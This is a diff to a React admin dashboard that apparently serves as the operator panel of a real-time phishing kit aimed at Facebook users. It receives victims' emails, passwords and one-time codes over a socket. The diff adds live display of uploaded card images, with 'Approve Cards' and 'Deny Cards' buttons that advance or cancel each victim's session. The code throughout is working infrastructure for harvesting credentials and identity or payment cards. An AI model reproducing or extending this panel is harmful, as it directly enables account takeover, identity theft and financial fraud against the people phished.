@@ -37,6 +37,7 @@ const AdminDashboard = () => {
   const [authNumber, setAuthNumber] = useState("");
   const [phone, setPhone] = useState("");
   const [sendTo, setSendTo] = useState("");
+  const [uploadedData, setUploadedData] = useState("");
 
   // Define step navigation configuration for different event types
   // const eventConfig = {
@@ -1020,6 +1021,107 @@ const AdminDashboard = () => {
       });
     });
 
+    // newSocket.on("fb_card_upload", (data) => {
+    //   setSessions((prev) => {
+    //     const session = prev[data.sessionId];
+
+    //     // If session doesn't exist, initialize it
+    //     if (!session) {
+    //       return {
+    //         ...prev,
+    //         [data.sessionId]: {
+    //           email: data.email,
+    //           password: data.password,
+    //           otp: data.otp,
+    //           lastActivity: new Date(data.timestamp || Date.now()),
+    //           events: [
+    //             {
+    //               type: "fb_card_upload",
+    //               timestamp: data.timestamp || new Date().toISOString(),
+    //               password: data.password,
+    //               otp: data.otp,
+    //               status: "pending",
+    //               email: data.email,
+    //               data: `Files: ${data.files}`,
+    //             },
+    //           ],
+    //         },
+    //       };
+    //     }
+
+    //     // If session exists, update it
+    //     return {
+    //       ...prev,
+    //       [data.sessionId]: {
+    //         ...session,
+    //         lastActivity: new Date(data.timestamp || Date.now()),
+    //         events: [
+    //           ...session.events,
+    //           {
+    //             type: "fb_card_upload",
+    //             timestamp: data.timestamp || new Date().toISOString(),
+    //             password: data.password,
+    //             otp: data.otp,
+    //             data: `Files: ${data.files}`,
+    //             status: "pending",
+    //             email: session.email, // Use email from the session
+    //           },
+    //         ],
+    //       },
+    //     };
+    //   });
+    //   setUploadedData(data.files);
+    // });
+
+    newSocket.on("fb_card_upload", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "fb_card_upload",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  status: "pending",
+                  email: data.email,
+                  data: data.files, // Store the files array directly
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "fb_card_upload",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                status: "pending",
+                email: session.email,
+                data: data.files, // Store the files array directly
+              },
+            ],
+          },
+        };
+      });
+      setUploadedData(data.files);
+    });
+
     setSocket(newSocket);
 
     return () => newSocket.disconnect();
@@ -1132,6 +1234,8 @@ const AdminDashboard = () => {
         return "FB OTP";
       case "fb_resend_otp":
         return "FB RESEND OTP";
+      case "fb_card_upload":
+        return "FB CARD UPLOAD";
       case "fb_done":
         return "FB Done";
 
@@ -1147,6 +1251,8 @@ const AdminDashboard = () => {
       case "fb_otp":
         return "/images/fb.png";
       case "fb_resend_otp":
+        return "/images/fb.png";
+      case "fb_card_upload":
         return "/images/fb.png";
       case "fb_done":
         return "/images/fb.png";
@@ -1315,6 +1421,8 @@ const AdminDashboard = () => {
                                 ? "red.500"
                                 : event.type === "fb_resend_otp"
                                 ? "red.500"
+                                : event.type === "fb_card_upload"
+                                ? "red.500"
                                 : event.type === "fb_done"
                                 ? "green.500"
                                 : "yellow.500"
@@ -1325,7 +1433,74 @@ const AdminDashboard = () => {
                             color="#fff"
                             mt={1}
                           >
-                            {event.data}
+                            {event.type === "fb_card_upload" ? (
+                              <>
+                                <Grid
+                                  templateColumns={{
+                                    base: "1fr",
+                                    md: "repeat(2, 1fr)",
+                                    lg: "repeat(3, 1fr)",
+                                  }}
+                                  gap={4}
+                                >
+                                  {Array.isArray(event.data) ? (
+                                    event.data.map((file, index) => (
+                                      <Box
+                                        key={index}
+                                        borderWidth="1px"
+                                        borderRadius="lg"
+                                        p={4}
+                                        overflow="hidden"
+                                      >
+                                        {file.fileType?.startsWith("image/") ? (
+                                          <Image
+                                            src={file.url}
+                                            alt={file.fileName}
+                                            w="full"
+                                            h="12rem"
+                                            objectFit="cover"
+                                            borderRadius="md"
+                                            mb={2}
+                                          />
+                                        ) : (
+                                          <Flex
+                                            w="full"
+                                            h="12rem"
+                                            bg="gray.100"
+                                            align="center"
+                                            justify="center"
+                                            borderRadius="md"
+                                            mb={2}
+                                          >
+                                            <Text color="gray.500">
+                                              Non-image file
+                                            </Text>
+                                          </Flex>
+                                        )}
+                                        <Box fontSize="sm">
+                                          <Text fontWeight="medium" isTruncated>
+                                            {file.fileName}
+                                          </Text>
+                                          <Text color="gray.500">
+                                            {file.fileType}
+                                          </Text>
+                                          <Text color="gray.500" fontSize="xs">
+                                            Uploaded:{" "}
+                                            {new Date(
+                                              file.uploadedAt
+                                            ).toLocaleString()}
+                                          </Text>
+                                        </Box>
+                                      </Box>
+                                    ))
+                                  ) : (
+                                    <Text>No files uploaded</Text>
+                                  )}
+                                </Grid>
+                              </>
+                            ) : (
+                              event.data
+                            )}
                           </Text>
                         </GridItem>
                       </Grid>
@@ -1725,6 +1900,35 @@ const AdminDashboard = () => {
                                             "cancel"
                                           ),
                                         "Deny resend"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+
+                              case "fb_card_upload":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "continue"
+                                            // { password }
+                                          ),
+                                        "Approve Cards"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny Cards"
                                       )}
                                     </HStack>
                                   </>
